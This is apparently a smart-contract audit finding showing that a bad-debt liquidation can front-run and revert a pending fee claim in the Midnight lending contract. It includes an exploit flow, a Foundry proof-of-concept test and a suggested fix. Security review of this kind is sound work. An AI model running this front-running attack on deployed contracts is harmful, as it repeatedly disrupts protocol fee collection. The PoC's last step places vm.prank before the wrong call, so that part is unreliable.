### Title
Bad-debt realization in `liquidate()` can front-run and permanently revert a pending `claimContinuousFee()` call - (`File: src/Midnight.sol`)

### Summary
`claimContinuousFee()` performs an unchecked subtraction on `continuousFeeCredit` with no guard that `amount ≤ continuousFeeCredit` at execution time. `liquidate()` unconditionally reduces `continuousFeeCredit` via a `mulDivDown` ratio whenever bad debt is realized. An unprivileged liquidator can front-run a pending `claimContinuousFee()` transaction with a bad-debt liquidation, shrinking `continuousFeeCredit` below the claimed `amount` and causing an arithmetic underflow revert.

### Finding Description

**Code path — `claimContinuousFee` (`src/Midnight.sol:312-325`):**

```solidity
function claimContinuousFee(Market memory market, uint256 amount, address receiver) external {
    bytes32 id = toId(market);
    MarketState storage _marketState = marketState[id];
    require(msg.sender == feeClaimer, OnlyFeeClaimer());
    require(_marketState.tickSpacing > 0, MarketNotCreated());

    _marketState.continuousFeeCredit -= UtilsLib.toUint128(amount);  // line 318 — no prior bound check
    _marketState.totalUnits -= UtilsLib.toUint128(amount);
    _marketState.withdrawable -= UtilsLib.toUint128(amount);
    ...
}
```

There are exactly two `require` guards: caller identity and market existence. There is **no** `require(amount <= _marketState.continuousFeeCredit)`. The subtraction at line 318 will revert with an arithmetic underflow (Solidity 0.8 checked arithmetic) if `continuousFeeCredit` has been reduced below `amount` between the time the feeClaimer read the state and the time the transaction executes.

**Code path — bad-debt reduction in `liquidate` (`src/Midnight.sol:635-640`):**

```solidity
_marketState.continuousFeeCredit = _lossFactor < type(uint128).max
    ? UtilsLib.toUint128(
        _marketState.continuousFeeCredit
            .mulDivDown(type(uint128).max - _marketState.lossFactor, type(uint128).max - _lossFactor)
    )
    : 0;
```

`_marketState.lossFactor` here is the **new** (already-updated) loss factor, which is strictly greater than the old `_lossFactor`. Therefore `(type(uint128).max - newLossFactor) < (type(uint128).max - oldLossFactor)`, the ratio is strictly less than 1, and `continuousFeeCredit` is strictly reduced. Crucially, `withdrawable` is **not** reduced by bad-debt realization — only `continuousFeeCredit` and `totalUnits` are.

**Exploit flow:**

1. Lender accrues fees; `updatePosition` is called → `continuousFeeCredit = X`.
2. feeClaimer reads `X` and submits `claimContinuousFee(market, X, receiver)` to the mempool.
3. Attacker (any liquidator) observes the pending transaction and front-runs with `liquidate(market, 0, 0, 0, borrower, false, attacker, address(0), "")` on a position that has bad debt (i.e., `badDebt > 0` in the liquidation loop).
4. `liquidate` reduces `continuousFeeCredit` from `X` to `X' < X`.
5. feeClaimer's transaction executes: `X' -= X` → arithmetic underflow → **revert**.

The Certora spec at `certora/specs/Role.spec:264` explicitly encodes this revert condition:
```
assert !reverted <=> ... && amount <= continuousFeeCreditBefore;
```
confirming that the function reverts whenever `amount > continuousFeeCredit` at execution time, with no other protection.

**Why existing checks are insufficient:**

`claimContinuousFee` has no slippage/bound check on `continuousFeeCredit`. The only protection against underflow is Solidity's checked arithmetic, which is precisely the DoS vector. The feeClaimer has no way to atomically read-and-claim without a race condition against any liquidator who can realize bad debt in the same block.

### Impact Explanation

Any pending `claimContinuousFee()` transaction where `amount` equals or approaches the current `continuousFeeCredit` can be made to revert by front-running with a bad-debt liquidation. The feeClaimer must resubmit with a reduced `amount` reflecting the post-slash `continuousFeeCredit`. If bad-debt positions exist across multiple borrowers, the attacker can repeat this for each feeClaimer submission, continuously delaying fee collection. The DoS is temporary per attempt but repeatable as long as liquidatable bad-debt positions exist.

### Likelihood Explanation

**Preconditions:**
- A borrower position with `badDebt > 0` must exist (organic market condition: oracle price drop below the `maxLif`-adjusted collateral value).
- The feeClaimer must have a pending `claimContinuousFee()` transaction visible in the mempool.

**Feasibility:** Both conditions are realistic in any active market. The liquidator role is fully unprivileged. The liquidation itself may be profitable (attacker receives seized collateral), making the net attacker cost potentially negative. The attack is repeatable across multiple bad-debt positions. On chains with public mempools (Ethereum mainnet), front-running is straightforward.

### Recommendation

Add an explicit upper-bound check in `claimContinuousFee()` before the subtraction:

```solidity
require(amount <= _marketState.continuousFeeCredit, InsufficientContinuousFeeCredit());
require(amount <= _marketState.totalUnits, InsufficientTotalUnits());
require(amount <= _marketState.withdrawable, InsufficientWithdrawable());
```

This converts the silent underflow revert into a descriptive revert, but does not eliminate the race condition. To fully mitigate, the feeClaimer should use a `minAmount` parameter or read `continuousFeeCredit` atomically (e.g., via `multicall`) and pass `min(requested, continuousFeeCredit)` as `amount`.

### Proof of Concept

```solidity
// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {Midnight} from "src/Midnight.sol";
// ... standard test imports

contract ClaimContinuousFeeDoSTest is Test {
    // Setup: standard market with lender, borrower, continuous fee enabled

    function testBadDebtFrontRunDoSClaimContinuousFee() public {
        uint256 credit = 1e18;
        uint256 feeRate = MAX_CONTINUOUS_FEE;
        uint256 ttm = 365 days;

        // 1. Lender supplies credit; borrower borrows
        setupLender(credit, feeRate, ttm);

        // 2. Advance time to accrue continuous fees
        vm.warp(block.timestamp + 30 days);
        midnight.updatePosition(market, lender);

        uint256 feeCredit = midnight.continuousFeeCredit(id);
        assertGt(feeCredit, 0, "fee credit must be nonzero");

        // 3. feeClaimer prepares to claim full feeCredit (tx in mempool)
        // Attacker front-runs: realize bad debt via liquidate(seizedAssets=0, repaidUnits=0)
        Oracle(market.collateralParams[0].oracle).setPrice(badDebtPriceDown(credit));
        // Attacker (any address) calls liquidate — no privilege required
        midnight.liquidate(market, 0, 0, 0, borrower, false, address(this), address(0), "");

        uint256 feeCreditAfterBadDebt = midnight.continuousFeeCredit(id);
        assertLt(feeCreditAfterBadDebt, feeCredit, "continuousFeeCredit reduced by bad debt");

        // 4. feeClaimer's original tx now executes with stale `amount = feeCredit`
        vm.prank(feeClaimer);
        vm.expectRevert(stdError.arithmeticError); // underflow: feeCreditAfterBadDebt -= feeCredit
        midnight.claimContinuousFee(market, feeCredit, feeClaimer);

        // 5. Assert: feeClaimer must resubmit with reduced amount
        vm.prank(feeClaimer);
        // Repay first so withdrawable covers the claim
        deal(address(loanToken), address(this), feeCreditAfterBadDebt);
        midnight.repay(market, feeCreditAfterBadDebt, borrower, address(0), "");
        midnight.claimContinuousFee(market, feeCreditAfterBadDebt, feeClaimer);
        // Succeeds only with the reduced amount — original claim was DoS'd
    }
}
```

**Expected assertions:**
- `vm.expectRevert(stdError.arithmeticError)` passes: the original claim with `amount = feeCredit` reverts after bad debt reduces `continuousFeeCredit`.
- The retry with `amount = feeCreditAfterBadDebt` succeeds, confirming the DoS is temporary but real. [1](#0-0) [2](#0-1) [3](#0-2)

### Citations

**File:** src/Midnight.sol (L312-325)
```text
    function claimContinuousFee(Market memory market, uint256 amount, address receiver) external {
        bytes32 id = toId(market);
        MarketState storage _marketState = marketState[id];
        require(msg.sender == feeClaimer, OnlyFeeClaimer());
        require(_marketState.tickSpacing > 0, MarketNotCreated());

        _marketState.continuousFeeCredit -= UtilsLib.toUint128(amount);
        _marketState.totalUnits -= UtilsLib.toUint128(amount);
        _marketState.withdrawable -= UtilsLib.toUint128(amount);

        emit EventsLib.ClaimContinuousFee(msg.sender, id, amount, receiver);

        SafeTransferLib.safeTransfer(market.loanToken, receiver, amount);
    }
```

**File:** src/Midnight.sol (L626-641)
```text
        if (badDebt > 0) {
            // forge-lint: disable-next-item(unsafe-typecast) as badDebt <= _position.debt
            _position.debt -= uint128(badDebt);
            uint256 _totalUnits = _marketState.totalUnits;
            uint256 _lossFactor = _marketState.lossFactor;
            _marketState.lossFactor = UtilsLib.toUint128(
                type(uint128).max - (type(uint128).max - _lossFactor).mulDivDown(_totalUnits - badDebt, _totalUnits)
            );
            _marketState.totalUnits -= UtilsLib.toUint128(badDebt);
            _marketState.continuousFeeCredit = _lossFactor < type(uint128).max
                ? UtilsLib.toUint128(
                    _marketState.continuousFeeCredit
                        .mulDivDown(type(uint128).max - _marketState.lossFactor, type(uint128).max - _lossFactor)
                )
                : 0;
        }
```

**File:** certora/specs/Role.spec (L251-264)
```text
rule feeClaimerCanClaimContinuousFee(env e, Midnight.Market market, uint256 amount, address receiver, address user) {
    bytes32 id = toId(e, market);
    address feeClaimerBefore = feeClaimer();
    bool marketIsCreated = marketIsCreated(id);
    uint256 withdrawableBefore = withdrawable(id);
    uint256 totalUnitsBefore = totalUnits(id);
    uint128 continuousFeeCreditBefore = currentContract.marketState[id].continuousFeeCredit;
    mathint midnightBalanceBefore = tokenBalance[market.loanToken][currentContract];
    mathint receiverBalanceBefore = tokenBalance[market.loanToken][receiver];
    mathint userBalanceBefore = tokenBalance[market.loanToken][user];

    claimContinuousFee@withrevert(e, market, amount, receiver);
    bool reverted = lastReverted;
    assert !reverted <=> e.msg.sender == feeClaimerBefore && e.msg.value == 0 && marketIsCreated && amount <= withdrawableBefore && amount <= totalUnitsBefore && amount <= continuousFeeCreditBefore;
```
